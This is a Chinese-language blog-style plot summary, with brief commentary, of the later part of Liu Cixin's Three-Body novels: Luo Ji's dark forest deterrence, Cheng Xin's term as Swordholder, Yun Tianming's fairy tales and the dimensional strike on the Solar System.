<p>​        章北海成为了这五艘战舰公认的英雄，如果他也是面壁者的话，他会是一名成功的面壁者。这无五艘战舰开始前往寻找新家园，但他们发现，最近的太阳系，以现在的速度航行，也要两千年。五艘战舰的燃料，配件，补给，只够一艘飞船达到目的地。所有人都渐渐明白这个残酷的事实，不是你死，就是我活。随着时间的推移。五艘战舰开始了彼此间的互相猜疑，都担心对方会首先发动攻击。终于，章北海下定决定要使用次声波氢弹首先发动攻击，这种攻击不会对船体造成伤害，只会消灭船内所有生命。但就当他要摁下发射键的时候，自然选择号首先遭遇了次声波氢弹袭击。在听到预警袭击的警报时，章北海放弃了发射，意味深长的说了一句，没关系，都一样。</p>
<p>​        瞬间，自然选择号全体船员，在次声波氢弹的袭击下，集体阵亡。发起首攻的是终极规律号战舰，他向其他的战舰也发出了次声波氢弹，但终极规律号并没有成为幸存儿，早就准备好的蓝色空间好抽干了船内的空气，没有空气，次声波就不会有任何作用。蓝色空间号随机反击，用全部武器集火终极规律号，终极规律号被彻底摧毁。随后，蓝色空间好开始打扫战场，他们拿走了所有能带的东西，飞向了远方。他们承载的人类的全部思想和记忆，怀抱着地球所有的荣光与梦想，默默地消失在永恒的夜色中。</p>
<p>​        再来看看地球这边，正所谓物极必反，乐极生悲。之前还手舞足蹈欢呼庆祝的人们，当亲眼看见战舰像鞭炮一样炸没时，瞬间全部崩溃，地球人开始陷入绝望，自杀的人络绎不绝。绝大多数人通过肆无忌惮的纵欲来麻痹自己。绝望充斥着这个世界。水滴飞向了太阳，并不断对太阳发出强烈的干扰信号，从此人类再也无法通过太阳作为放大天线，向宇宙发出任何信号。</p>
<p>​        罗辑这边，当他和史强从外面回到家时，发现成千上万的人在等他，人们都把他奉为救世主，全部跪在罗辑面前。他们说，主啊，救救我们吧。原来罗辑之前发出的咒语生效了，那颗指定的恒星被一颗光粒穿过，爆炸了。</p>
<p>​        现在所有人都相信罗辑是某种神，罗辑被恢复了面壁者身份，成为了地球上唯一的面壁者，同时也成为了人类唯一的信仰。现在无论他说什么，人们都会照办。罗辑立刻提了两条要求，第一、所有城市恢复秩序；第二、所有人都回家吧，让我静静。人群散尽后，逻辑给惊讶不已的史强解释了为什么咒语会生效，他提出了黑暗森林法则。</p>
<p>​        首先，宇宙的总量是恒定的，但宇宙中有无数的外星生命都在以指数增长。所以宇宙是一个生存死局。不是你死，就是我亡。在这种严格竞争下，一方的收益必然意味着另一方的损失，双方不存在合作的可能。也就是说，自己文明的未来，就是建立在他人文明的痛苦之上，只有损人利己才能活下去。其结果就是，一方吃掉另一方，所以每个文明都必须为了生存而战。再弱小的文明都有可能技术爆炸，从人类文明来看，我们从猿猴到现在，从宇宙的尺度，就是一瞬间的事，这就导致文明之间，随着时间推移会不断出现猜疑，大家脑子里都在想，他会不会来干掉我，抢我资源，这种不断形成的猜疑链。停止的方法，只有一方死了才会结束。所以为了避免其他文明技术爆炸，在以后跟自己争夺资源。最安全的方法就是发现一个文明后，能消灭的就直接消灭，打不过的就绕着走。</p>
<p>​        罗辑把宇宙比喻成一走黑暗森林，每个文明都是带枪的猎人，像幽灵一般前行在林间，每个猎人都必须小心，因为只要暴露自己的位置，就会被其他文明干掉，毕竟这是保证自己安全最好的手段。</p>
<p>​        我相信玩过吃鸡的人都明白这种感受，想要活下去就得干掉其他人。</p>
<p>​        罗辑之前的咒语，就像是在森林中的某棵树上做了标记，那么其他的猎手最安全的行为，就是悄悄毁掉那片区域。毕竟对于高级文明来说，攻击是最节省成本的。但现在罗辑再也发不出咒语了，因为水滴封锁了太阳信号。其实早在幸存舰队之间的黑暗战役传回地球后，罗辑就已经确信，黑暗森林法则是没有问题的。罗辑只让史强明白了真相，并让他保密.他现在无计可施，渐渐地，罗辑开始借酒消愁，闭门不出，像个流浪汉一样在街上游荡.后来政府机构强迫罗辑随便干点什么以增加人民的信仰，给了罗辑雪地项目。</p>
<p>​        这个项目是通过恒星氢弹，和海王星的油膜物质制造太空尘埃，以便在其余九个水滴到达地球前，可以提前观测到。这个计划显然是没事找事，毕竟观测的唯一作用便是，知道其余水滴什么时候到地球，罗辑无奈之下开始负责这个项目。随着工作的进展，逻辑把全部身心都投入到了雪地工程，把这当成一种逃避手段.但他越投入，人们就越失望。大家逐渐看清，罗辑的行为是在逃避，这是一个希望和失望来的一样快的时代。公众对罗辑失去了信心。很多人都开始怀疑罗辑的咒语，不过是一次巧合。罗辑从人们心中的神，变成了普通人，又变成了大骗子。他面壁者的实际权力也没有了。雪地工程也不得不停止。</p>
<p>​        在一个秋雨连绵的下午，罗辑被逐出自己生活多年的小区。他穿着很脏的外套，拿着铁锹，走到了最初和叶文洁对话的那片墓地。他在叶文洁墓旁开始给自己掘墓，最后精疲力尽的他，趟进坑中回想起自己的一生，他知道，是时候了。他虚弱的拿起手枪，对着空气高喊。我，要和三体人对话。随后露出了手腕上的手表，这是一个检测我生命体征的摇篮系统，只要我死了，学弟工程上的三千六百一十四颗氢弹就会爆炸，由此形成无比巨大的油膜，将会通过太阳反射出三张无比简单的突然，这三张图就是三体星球的坐标。宇宙中其他的文明将会知道你们的存在。他说，30秒后我将对自己的心脏开枪，虽然我知道三体星球暴露后，地球也会随之暴露，但我，只能这样做。</p>
<p>​        短短几秒，一直无处不在的智子在罗辑面前展开成三个球，上面写着，住手。三体人通过智子又说，你把枪放下，咱们好好谈。随后罗辑提出的几个条件三体人都照办了。第一、水滴飞离太阳系；第二、三体飞船离开来太阳系的轨道。</p>
<p>​        罗辑胜利了，他完成了面壁者的使命，他虚弱得差点晕过去，智子不断地关心罗辑的身体状况，生怕摇篮系统终止。摇篮系统是非常严谨的，如果水滴试图去触碰雪地工程上的氢弹，也会引发爆炸。他很幸运，如果不是三体人因为猜疑，消灭了人类叛军，罗辑早就死了。</p>
<p>​        五年后。罗辑和他的妻女来到了三体人帮地球人建造的引力波天线附近玩耍，这种天线不需要通过太阳，直接就可以像宇宙发射信号，正在玩耍的一家人，突然看见智子在他们面前展开，与他对话的是当年警告人类不要回复的监听员1379。他与逻辑相互表达敬意。临近晚霞，1379说，太阳快落下去了，你们的孩子居然不害怕。罗辑回答道，当然不害怕，她知道，明天的太阳还会升起来。</p>
<p>​        从叶文洁开头和罗辑的对话可以看出，这个把人类坑死的女人，在那时貌似开始有了一丝愧疚。社会中一时兴起的逃亡主义，由于只有少部分人可以逃走，所以被大部分人禁止了。在此时，人人向往的公平，反而成为了人类生存的障碍。在智子的监视下，人类变得毫无隐私，人们为了欺骗三体人，制定了面壁者计划，选出四位大骗子作为面壁者去骗三体人，其中三位面壁者都是世界知名人物，看似志在必得，信心满满，但都被一一击败，而罗辑却成为了真正的救世主。人类从绝望的大低谷时代觉醒，进入了信心满满的新时代，却又在末日之战中再次陷入了绝望，这里好像是在说，人总是好了伤疤忘了疼。从幸存的那几艘飞船之间的战斗，再到宇宙的黑暗森林法则可以看出，竞争是残酷的。宇宙是一个生死局，不是你死就是我活。从逃亡主义，到泰勒和雷迪亚兹要以杀死自己人为代价，去威慑三体人；再到罗辑怕公众知道黑暗森林法则后大家反对自己的计划所以不敢公布，这些或许想告诉我们，大多数人都是自私的，整个故事无论是叶文洁的悔悟，还是罗辑的成长，又或是人类从痛苦的反省，这些都仿佛在告诉我们，痛苦是成长的催化剂。</p>
<h3 id="死神永生-上"><a href="#死神永生-上" class="headerlink" title="死神永生 上"></a>死神永生 上</h3><p>​        这个故事要从一个叫云天明的人开始说起。在以前的危机纪元4年，那个时候的人们心情很复杂，外星人400年后会来侵略地球这个消息，在那会可是一个既新鲜又可怕又劲爆的消息，各个媒体都在铺天盖地的报道这件事情。不过在云天明眼里，什么三体人四百年后会侵略地球，那都不是事儿，因为以他的病情，明年的事都不用他操心了。他的身边没有几个亲戚，其中他的姐姐还总想让他早点安乐死，那时候，治疗绝症就是个花钱的无底洞，对于拖家带口还没买房子的姐姐来说，弟弟云天明早点死她还能从父亲那拿到不少遗产。云天明也很识趣，也不想受罪。想着，就这两天准备安乐死吧。</p>
<p>​        就在他想着安乐死的这件事儿的时候，云天明的同学胡文，带着创业成功的喜悦找到了云天明。胡文的公司主要是卖饮料的，胡文能来找云天明并不是他们之间关系有多好，而是胡文卖饮料能成功，是因为，云天明的一个点子。这个点子来自于云天明对饮料独特的爱好，这个爱好就是，在矿泉水里塞野草喝。胡文当场给了云天明三百万，这笔钱对云天明来说可有可无，云天明本想拒绝，但胡文非常坚持，无奈之下云天明才收下了这笔巨款。没多久，云天明还是决定安乐死，他的病已经重到五福享受这300万了。这笔巨款他并不打算留给姐姐，毕竟云天明已经如姐姐所愿，赶紧去阎王爷那报道了。此时，他突然灵光一闪，云天明决定用这笔钱，给他大学里暗恋的程心送一颗星星，一颗真正的星星。</p>
<p>​        那去哪买一颗星星呢？这是联合股展开了一项群星计划，主要的目的，是骗钱。。。对外叫筹款。他们拍卖太阳系外的部分恒星所有权，买到了，则会得到一张纸，上面标明你的合法所有权。晚上的时候你就可以望着这颗星星，心理暗爽，哈哈，这颗星星是我的了。然后就没什么乱用了。如果你想去那里，不好意思，不可能。最近的恒星都有一百多光年的距离，所以这个计划，开始时就结束了，总共也没卖出去多少颗。不过有没有用对于云天明现在来说已经不重要了，他从胡文那要到了程心得个人资料，花了三百万，匿名买了一颗恒星送给程心。不禁感叹，云天明真是个浪漫的人啊。第二天，云天明开始接受安乐死。正当他要摁下最后的确认按钮时，程心带着人突然出现。程心对他说出的第一句话非常出乎意料，天明，你知道么，安乐死法是为你通过的。 </p>
<p>​        这话就要从阶梯计划说起来，当时程心在情报局工作，局长叫维德，是一位雷厉风行的关键人物，他有一句广为人知的口号：前进，前进，不择手段的前进。维德想发射一枚速度达到百分之一光速的探测器，去获得三体舰队的情报，在这时，造一枚百分之一光速的探测器是不大现实的。但程心提出了一个设想，造出一枚只有辐射帆的小型探测器，并在辐射帆的航行轨道布置核弹，每一次核弹爆炸都会使飞船加速，这个过程，很像在攀登阶梯，该计划，被命名为阶梯计划。这个计划的负责人，正式程心，这枚探测器必须非常的轻，由于技术的限制，导致探测器小到只能放入一个被急冻的人脑，阶梯计划真是没有办法的办法，大家只能选择相信三体人有能力把一颗人脑还原成一个人，并且他们愿意去这么做。这种行为无异于赌博，且失败率很高，但只要成功，只要有一个人能进入三体舰队的内部，就会引起无限的可能性。程心在执行这一计划时，得知有人匿名送给了自己一颗星星，这对他来说是一个巨大的惊喜。此刻的她陷入了从未有过的幸福感。</p>
<p>​        阶梯计划正在紧锣密鼓的进行着。但用谁的大脑成了问题，在社会道德的压力下，这个人只能从身患绝症并且愿意安乐死的人中选，而且这个人的资历要够也愿意这么做。程心在一次和同学的聊天中，得知以前的同学云天明，身患绝症早已时日无多，程心没有多想，便把它纳入了人选之中，随后便有了程心阻止云天明安乐死的那一幕。</p>
<p>​        云天明得知了这来龙去脉后，接受了女神的请求，加入了阶梯计划。当云天明的大脑被取出后，程心才得知那颗星星正式云天明送的，此时她突然意识到自己做了什么。因为等待云天明的可能是无尽噩梦。假如三体人真的捕获了云天明的大脑。反复虐待也不是没有可能。阶梯计划开始了， 但百密终有一疏，探测器偏离了航线，飞向了无尽的深空。情报局的领导们选中程心冬眠，到未来继续跟进阶梯计划。希望能有奇迹发生。</p>
<p>​        罗辑利用黑暗森林法则拯救了地球后，人们从此进入了威慑纪元。三体人在这个年代，看似跟人类是你好我好大家好。人们感觉，三体人解除了对地球的科技封锁，并细致入微不厌其烦的传授科学。有时自己还被三体人嫌弃学得慢，被催着快点学。人们觉得，自己一下子获得了被压抑几个世纪的知识。</p>
<p>​        三体人还帮助人类建造了引力波天线，和引力波飞船，万有引力号。来帮助人类利用这些工具威慑自己。人们需要建造引力波发射装置，是因为用引力波向宇宙发射信息，比人类之前用的任何手段都靠谱有效。当初人类舰队被水滴团灭，在战场上，只有量子号和青铜时代号，这两艘战舰成功逃离，由于资源有限，青铜时代号突袭了量子号。带着量子号的物资飞往了另一边，经过漫长的一段时间，青铜时代号返航了，现在飞船上的人可以用肉眼看到地球了。他们激动地喊着，回家了，回家了！他们幻想着回到地球上安逸的生活，和被人崇拜的感觉。</p>
<p>​        之前，他们收到了一条消息，被告知，人类对三体世界的威慑，已经成功建立，让他们尽快返航。一开始没人信，后来智子在青铜时代号上展开，并建立了通信，这时青铜时代号上的人才信了。并且他们得知，自己已经成为了人们的英雄，全世界的人们都在盼望着他们回归，青铜时代号的人回到太空港后，战舰上的人，看到人山人海，都在为他们忘情的欢呼着。当青铜时代号上所有人都离舰后，突然一片寂静，迎接他们的人当中有一位上校，开口说了一番话，大致内容如下：你们已被开除了军籍，你们带来的耻辱，永远无法被抹灭，你们的亲人不想见到你们呢，他们以你们为耻，他们恨你们，你们将被移交到司法系统。</p>
<p>​        说完后，大批武装部队出现，逮捕了他们。罪名是一级谋杀和反人类罪。在审判中大家才知道，在当时没有退路的太空里，青铜时代号的人们建立了集权社会，为了集体生存，几乎每个人都放弃了自我，成为了集体的一部分。青铜时代号准备对另一艘战舰发起进攻时，曾有一次投票，舰上94%赞成攻击。当用次声波氢弹解决了量子号后，人们把上面的尸体全部补充进了食品库存，成了船员的食物。</p>
<p>​        最后审判的结果是，138人无罪，6名高级军官终身监禁，其余的人均被判刑。刑期从二十年至三百年不等。在他们进监狱前，有几位青铜时代号上的军官，被宪兵押送着最后一次进入了他们的战舰，进行一些交接工作。其中有一位被押送的军官，史耐德，他在交接完成时，突然进入另一件操作室，快速调出一个通信界面，他说道，青铜时代呼叫蓝色空间！青铜时代呼叫蓝色空间！就在此刻，一束激光穿过他们的胸膛，他用尽最后的生命喊出一句话：不要返航！这里不是家！</p>
<p>​        本来蓝色空间好还在犹豫中，当收到这个警报时，它立刻全功率加速，能飞多远飞多远。不久后万有引力号飞船开始追击逃跑的蓝色空间号，为什么要追呢？因为当人类得知黑暗森立法则后，特别害怕被其他外星文明发现，所以，追击蓝色空间号并将其摧毁，成为了万有引力号当前的首要任务。三体人派出了两个水滴去协助万有引力号。</p>
<p>​        人类文明从三体人那学到了越来越多的东西，而三体人也从人类璀璨的文化中学到了不少。当人们知道，三体人喜欢地球文化时，一开始是不相信的，后来三体人给人们看了很多，自己模仿人类文化的艺术作品，包括电影、小说、绘画等，这些作品，都是用人类作为角色，环境也都是地区上的。这时人们才相信。人们用AI和仿生技术，帮智子造了一个身体，智子成为了有躯体的机器人，摇身一变成为了一位魅力庄重的日本女人。</p>
<p>​        威慑纪元六十一年，程心从冬眠中被唤醒，但并不是因为阶梯计划，而是因为云天明从给他的星星。这颗恒星被发现周围还有两个行星，其中一个与地球十分相似。发现这些的是一名叫艾AA的女博士，一位像鸟儿一样轻灵的女孩子。他后来成为了程心得好友和得力助手。</p>
<p>​        由于现在人们已经具备了星际远航的能力，所以这个消息一出，这颗恒星的价格马上开始飞升。联合国唤醒程心就是为了买下这颗星星。程心因为这个星星开始小有名气。刚来到新世界的程心，自然是很不适应，就像是刘姥姥进大观园一样，看啥都新鲜。在这个和平盛世的年代，男性们都趋于女性化，到处都是精致的女装大佬，程心一开始走在大街上，还以为男人都灭绝了。她不禁感叹，这个时代太温柔了。</p>
<p>​        一天，诚信接到AA的邀请，去一个地方。程心到了后并没有找到AA，等待她的是之前自己的上司，维德冷静的向程心连开两枪，维德告诉他，我与你并没有私人恩怨，只是我需要成为执剑人，而你会阻止我。我必须不择手段的前进。</p>
<p>​        但AA和警察及时赶到，击断了维德的手臂，救了差点死掉的程心。还好AA及时发现了有人伪造她的声音跟程心通话。不然，诚信死定了。维德说的执剑人是什么，跟程心有用什么关系呢？在亚洲，北美，和欧洲，分布着三个引力波天线。还有一个在太空中的引力波天线，就是万有引力号飞船。执剑人掌握着启动引力波天线，向宇宙发射三体恒星坐标信号的权利。只要三体人不老实，信号就会发出去。不久后，三体世界和人类世界都会遭到黑暗森林打击。此时三体和人类这两个世界的文明都掌握在一个人的手里，这个人，就是逻辑。</p>
<p>​        此时的罗辑是第一任执剑人，在这个温柔的年代，人们惧怕危险的执剑人，渐渐的温柔的人们希望执剑人也是温柔的。于是民心所向，大家选择了程心作为下一任执剑人。这个时代的医疗技术已经很先进了，程心恢复得很快。不久后，程心见到了已是百岁老人的罗辑，此时的她已经白发苍苍，十分稳重而且坚定。从前的那个玩世不恭的花花公子消失了，他的妻子和孩子早已离开了他。罗辑在他人眼里变得越来越像一个恶魔，执剑人的交接仪式开始了，罗辑把控制引力波发射按钮的权杖，交给了程心， 罗辑退休了，他完成了使命。而程心万万没想到，她这个执剑人只当了15分钟，就在交接完后，潜伏在太阳系的六颗水滴，突然发动攻击，程心听着警报声不知所措，内心纠结的程心决定扔掉手中的发射控制器。</p>
<p>​        顷刻间，地球上三个引力波发射天线，全部被水滴撞毁。地球从此丧失了黑暗森林威慑能力。三体人一直隐藏着一项本领没有交给人类，那就是制造光速飞船的技术。三体人现在已经造出了光速飞船，四年后，新的三体舰队即将抵达地球。</p>
<p>​        三体人打破了两个文明间脆弱的平衡，智子给人们一年期限全部移民澳大利亚，如有不从者，格杀勿论。三体人不想灭绝人类，完全是出自于对地球文化的热爱和敬意。</p>
<p>​        但大多数人还沉浸在温柔乡里 ，不肯离去，等待奇迹发生。智子一看，原来你们把我说的话当耳旁风，于是没过多久，水滴开始在大城市里乱撞，高楼大厦逐个崩塌，一天内死了三十多万人。人们无奈之下开始往澳大利亚迁徙。</p>
<p>​        一年后，澳大利亚聚集了四十一亿六千万人，智子和水滴不可能管理这么多人，于是他们开始招募地球治安军，三体人给的待遇非常丰厚，既可获得自由，又可获得权力。一时间十亿人争相报名，最后有五百万人通过。</p>
<p>​        这帮治安军，开始还很收敛，但后来，随着澳大利亚的人越来越多，这帮人渐渐变成了魔鬼。随着移民期限的到来，治安军开始大量屠杀没有移民进澳大利亚的人。很多人组成了抵抗三体人的组织。这帮抵抗军的精神领袖便是罗辑。但他们并打不到三体人，因为三体人还没到。他们只能打打身为治安军的人类。</p>
<p>​        当移民结束后，智子切断了对澳大利亚的供给，包括食物，电力等生活必需品。智子的大意就是告诉澳大利亚的人们，你们现在开始人吃人吧。等人口降到三千万到五千万后，我们再开始供给。程心和AA也移民到了澳大利亚，她没被失望的人们打死，得多亏AA和智子的关照。</p>
<p>​        智子本来想带程心离开澳大利亚但被程心拒绝了，她把这个机会给了AA。程心当然知道，自己可能会在这被人吃掉，但心灰意冷的她，早就不在意了。</p>
<p>​        另一边正在追击蓝色空间号的万有引力号，三体人以为他们已经被跟随的水滴解决掉了。但是，万万没有想到，蓝色空间号进入了一个思维碎块，在这个空间里看三维时间的物体，就像看到了细节丰富的三维展开图。如果我在思维空间里拿走三维空间里一个人的心脏，这个被拿走心脏的人，不会有丝毫外伤，简直就是隔空取物。水滴虽然外表坚不可摧，但内部却很脆弱，人们通过四维空间，破坏了水滴的内部，随后，蓝色空间好通过思维空间进入了万有引力号，并控制了这艘飞船。不久后，蓝色空间号吸收了外有引力号上的两百多位船员。经过集体商议，他们认为三体人应该已经占领了地球，打破了和平协议。最终，大家决定，通过万有引力号，向宇宙发出三体恒星的坐标，进行打击报复。这两艘飞船履行完了对人类最后的责任，便继续向星海深处飘去。</p>
<p>​        万有引力号向宇宙发出三体的恒心坐标后，三体世界的恒星马上就被一颗光粒穿过，被彻底毁灭了。从此人们进入了广播纪元。</p>
<p>​        大移民完成后的第六天，三体恒行星被摧毁了。三体人彻底放弃了占领地球，因为他们知道，由于两个文明间长年累月的通讯，三体文明被打击后，太阳系被毁灭也只是时间问题。智子放弃了移民计划，苦难结束了。人们四处欢呼。</p>
<p>​        广播纪元七年，AA在澳大利亚没留多久，这些年她程心的公司打理的很好，成为了太空建筑业的巨头。那些三体人的人类治安军们开始被清算，无数的治安军被判处死刑或监禁。四年后，人们在地球上观测到了三体母星的毁灭，威胁了人类近三个世纪的三体世界，被彻底摧毁了。智子在广播纪元初消失了，偶尔也会作为三体世界的传声筒出现。为什么人类现在不去干掉智子，别忘了，水滴还在地球上呢。</p>
<p>​        有一天，智子突然请罗辑和程心去她家里喝茶，想和这两个老朋友叙叙旧。人们及其重视这次会谈，希望他们能带回一些有价值的信息，当所有人知道三体世界被毁灭后，智子曾代表全三体人在国际社会发表了一段简短的讲话。话语里没有谴责，没有怨恨，没有评价，只是简单通报了灾难过程。三体文明从此开始了星舰文明。</p>
<p>​        罗辑和程心进入了智子的家里。随后，开始了具有重要历史意义的茶道谈话。这场谈话一开始，程心就急于询问各种问题，智子给出的回答，大概就是，太阳系被摧毁是肯定的，但需要一段时间。可能有一两个世纪。当务之急，就是赶紧跑。随后，智子希望不要再被提问。她说，我请二位，是来喝茶道别的。此时，一直沉默的罗辑开口说，我可以再问一个问题么？智子请罗辑稍等一下，沉思过后对罗辑说道，可以，这是出于我们三体人对罗辑您的尊重，但我只能回答你，是，不是或不知道。然后，我便不会再回答二位任何问题了。罗辑丝毫没有犹豫，问出了最后一个问题。在宇宙中存不存在一种安全声明，可以避免黑暗森林打击。整个屋子寂静了很久，智子终于开口了，她说，有。</p>
<p>​        茶道谈话结束了，所有人都在思考如何发布安全声明。宗教总是在人们消极的时代兴旺，地球逐渐成为一个大教堂，一颗祈祷之星。由于三体人知道如何发布安全声明，三体成为了人们心中的神，智子成为了被祈祷的对象。智子的家门口，每日都有成千上万的人在此祈祷，但智子每次也只是向众人微微鞠躬，然后悄然退去。智子要离开的那一天到了，它会离开这个美丽的躯壳，飞往三体舰队。她最后一次会见了罗辑和程心，这次，三个人没说什么话，因为他们都知道，该说的都说完了。智子打破了寂静，她说，我要走了，请二位多多保重。宇宙很大，生活更大，也许以后还有缘再见。还有，程心，云天明要见你。</p>
<p>​        三体文明比地球文明强大太多了，人类在三体人眼里就是虫子，三体人面对虫子的威胁，表现出来的不是憋屈，不是不情愿，而是非常真诚，但又不停地群钊打破这种平衡的可能，这招用的好厉害。差点就把人类给搞定了。看来不懂计谋的三体人，跟人类打交道的这300多年里，跟着学会了不少阴招。两个文明的平衡，就握在执剑人手里，一个合格的执剑人才能保持这种平衡。可惜，想用爱拯救世界的程心不是这个人，在三体的母星被摧毁后，三体人面对自己的宿敌，表现出了得体、礼貌和成熟，没有丝毫怨恨，也没有谈论是非，仅用平淡的茶会结束了300多年的对决。</p>
<h3 id="死神永生-下"><a href="#死神永生-下" class="headerlink" title="死神永生 下"></a>死神永生 下</h3><p>​        智子对程心说，云天明要见你，这句话从何说起。原来，当初三体人一直关注着阶梯计划，当第一批三体舰队，因为罗辑的威胁被迫离开太阳系后，他们决定，去找装有云天明大脑的探测器作为纪念品。</p>
<p>​        从云天明能见程心来看，云天明在三体飞船那里混得还算不错。三体人严正声明，这只是云天明和程心两个人之间的事，双方不能提及三体文明，会面不得有第三方在场，也不能以任何形式记录，为了保证隔离性，这次会面设立在太空中。程心乘坐飞船飞到指定地点后，智子将简历远程的实时视频通讯。如果三体人发现，谈话中设计不允许提及的内容，那么，程心得飞行器将会爆炸。</p>
<p>​        通讯开始了，程心看到了云天明，他的身体被三体人复原了，云天明看起来很健康，很年轻。云天明告诉程心，他在三体飞船上平时除了种地消遣，就是给三体人的孩子们讲故事。这里顺带一提，由于三体文明文化的匮乏，所以三体人特别喜欢挺云天明讲故事。云天明还在那出了书，成为了三体世界知名的文学家。由于三体人已知监视着这场谈话，云天明在跟程心聊了很多家常话后，便给他讲了三个他在飞船上经常给三体人讲的故事。谈话便结束了。在最后的一分钟，程心对云天明提出了约会邀请，她说，宇宙很大，生活更大，我们还会相见的。如果有机会，就在你送给我的那颗星星上见面吧。云天明在最后一刻回答到，好，在我们的星星。</p>
<p>​        通讯结束。当程心返航后，被立马带进了一个小房间，这个房间是智子盲区。虽然三体人已经明确表示，智子会全部撤离地球，单位了保险起见，为了云天明的安全，需要在这里记录下谈话的内容。程心在返程中，心理不断背着云天明给她将的三个故事，因为她知道，这三个故事就是拯救地球的关键，通过长时间的解读，人们终于发现了隐藏在这三个故事中的秘密。</p>
<p>​        1、光速飞船的法发展方向应使用空间曲率驱动器，这种驱动器是通过影响空间，利用空间的曲率把飞船拉至光速。打个比方，就像在小纸船的船尾，装一块小香皂，船会自动向前。这是因为肥皂改变了水的张力，但船前方水面的张力不变，从而把船拉了过去。2、用一层低光速带包裹住太阳系，这就是全宇宙通用的安全生声明。这个被包裹的区域被称之为黑域，在这个黑域里，没有飞船可以飞出去，黑域是一个完全封闭的空间，在这里，人们可以获得安全，但会失去自由。3。最后一个秘密暂且不表，因为直到最后，有人才发现了它。</p>
<p>​        三体人彻底离开而来太阳系。不久后人们为了避免被光粒打击的灾难，开始了，掩体工程。什么是掩体工程呢？以木星、土星、天王星和海王星四大巨星为掩体，在他们的背阳面建造太空城。为什么人们不造光速飞船准备跑路呢？一方面光速飞船会在太空中留下印记，很容易被高级文明观测到；另一方面，在这个时代人权意识极强，因为只有少部分人能离开，大部分人要留下，所以制造光速飞船成为了严重的违法行为。但程心和AA知道，建造光速飞船才是人类的出路。</p>
<p>​        有一天，维德找到了程心，对她说，造光速飞船是一条正确的路。但你没有力量造出来，把你拥有的一切资源给我，让我来，维德随后的一句话让程心同意了。他冷静的对程心说，不要犯第二次错，思索良久后，程心答应了维德。但她有个条件，她说，当你做的事危害人类的生命时，我可以收回你的权利。维德答应了。程心和AA进入了冬眠，等待成果。接下来，程心得公司全权由维德负责。</p>
<p>​        掩体纪元十一年，沉睡了62年的程心被唤醒，由于多次冬眠，程心现在的实际年龄是33岁，在这个平均寿命150岁的年代里，她还是个少女。在这个纪元，形成了四个太空城群落，分别分布在木星、土星、天王星、海王星的背阳面，地球成为了太阳系联邦中的一个普通城邦。现在地球上，人烟稀少，只有五百万不怕死的人生活在那里，每个人在那生活得像国王一样，大自然重新占领了地球。很多人不愿意留在地球是因为，如果太阳系遭受光粒打击，那么地球上的人将无一幸免。程心被带到了一座叫星环城的太空城，他在这见到了一百多岁的维德。维德一直在研发光速飞船，现在已经小有成果。但就在关键时刻，由于联邦政府的反复阻挠，维德与他们撕破了脸，维德现在被政府军包围。但以维德现在的实力，他可以拼死一搏，斗个鱼死网破。但他对程心有承诺，政府唤醒程心得原因，就是希望她可以权维德放下武器。经过维德六十年的努力，曲率驱动器已经研制的差不多了，是否能够继续，就看程心一句话。程心现在想，如果战斗开始，成千上万人会死于非命，善良的程心对维德说吗，你的诺言还有效吗？维德点了点头，程心说道，好，立刻停止一切。维德近乎恳请的说到，再考虑一下吧，程心坚定的说，不需要考虑。维德无助的说到，失去人性，失去很多；失去兽性，失去一切。程心果断的回答道，我选择人性。</p>
<p>​        现场寂静了，维德让众人放下武器，准备投降。维德心中勇往直前的火焰熄灭了。他微笑的对程心说，小女孩，你看我遵守了诺言。不久后，被捕的维德被处以死刑。程心想到未来，去看太阳系被打击后的世界。便再次进入了冬眠。</p>
<p>​        掩体纪元六十七年。此时一艘太空飞船发现了太阳系。这艘飞船主要的任务，就是藏好自己并清理他们发现的低级文明。其中，有一个被称为歌者的底层工作人员，向领导申请了一片叫二向箔的武器，漫不经心的将它仍忘了太阳系。</p>
<p>​        在太空城内，程心和AA都被唤醒了。黑暗森林打击终于降临了，没有人向掩体逃跑，因为太阳系并没有遭到光粒打击，而是受到了一片小纸条。人们通过引力波找到了这张没有厚度，只有一张信用卡代销的白色纸条。过了一段时间，这张小纸条突然越来越大，所有接触他的物体，都遭到了降维打击。从三维降到二维，成了一张画。在俄二向箔周围的飞船准备逃离，但他们发现，只有光速才能逃离二向箔的引力。以这张纸条变大的速度，八到十天后，整个太阳系都将变成一张没有厚度的画。这就是云天明在故事里，最后隐藏的秘密。降维打击。</p>
<p>​        人类多年来，殚精竭虑的在太阳系布置掩体城市，但人类知道掩体，难道那些拥有更高级明文的外星人就不知道吗？弱小和无知不是生存的障碍，傲慢才是。</p>
<p>​        程心和AA在冥王星上的太空博物馆里，找到了快两百岁的罗辑，三人寒暄了一阵后，开始将一些名画运到了飞船上。他们不希望这一些画同博物馆一同二维化。因为那样，未来到访的外星人可能就解读不了人类曾经的文化瑰宝了。罗辑自己留下了一幅画，这幅画就是蒙娜丽莎，他年轻时曾在这幅画面前，与一人陷入爱河。</p>
<p>​        罗辑催促他们尽快上飞船把画运到外面，他自己决定留在这个博物馆里，和蒙娜丽莎一起看着太阳系被二维化。其实，程心他们乘坐的这艘飞船大有来历，这艘飞船名叫星环号，不仅使用了些跟水滴一样坚固的材料，还装备了完整的生态系统和常规引擎，此外，还拥有曲率驱动引擎可进行光速航行。这艘飞船，是太阳系唯一一艘光速飞船。这是怎么回事呢？</p>
<p>​        罗辑通过远程视频通讯，告诉了一直蒙在鼓里程心和AA。原来，维德死后，残余的力量并没有放弃。曾经面壁者雷迪亚兹在水星上做爆炸试验，把水星炸了个大坑。为了隐蔽，维德的余党就把基地设立在了这里，他们对外表示在研究太阳活动。后来联邦政府介入，并一起悄悄地研究光速飞船。星环上安装的引擎就是第一代试验品。只有少数年迈的元老知道这件事，其中，就包括罗辑。</p>
<p>​        程心想回去接罗辑，但飞船不听程心的。因为罗辑，拥有这艘飞船的最高指挥权。罗辑笑了笑说，我这样岁数的人不适合远航，孩子们不要为我操心了，我什么都没有失去。罗辑命令星环号进入光速航行到太阳系以外。飞船开始启动，船后的空间开始畸变。</p>
<p>​        很多人乘坐着常规推动器的飞船，想逃出太阳系。但那是不可能的。但他们看到星环号后面的空间正在畸变时，这些人发现，这是一艘正在加速的光速飞船。于是，这些近乎疯狂的人，有的要去拦截，有的要去击毁，有的要去劫持。但星环号非常的坚固，这些人想把飞船刮破一点皮儿都难。如果当初程心没有组织维德，耽误了那宝贵的时间，光速飞船是个可以批量生产的。但现在，一切都晚了。程心从逻辑的眼神中读出了一句话，孩子，看看你都干了些什么呀。</p>
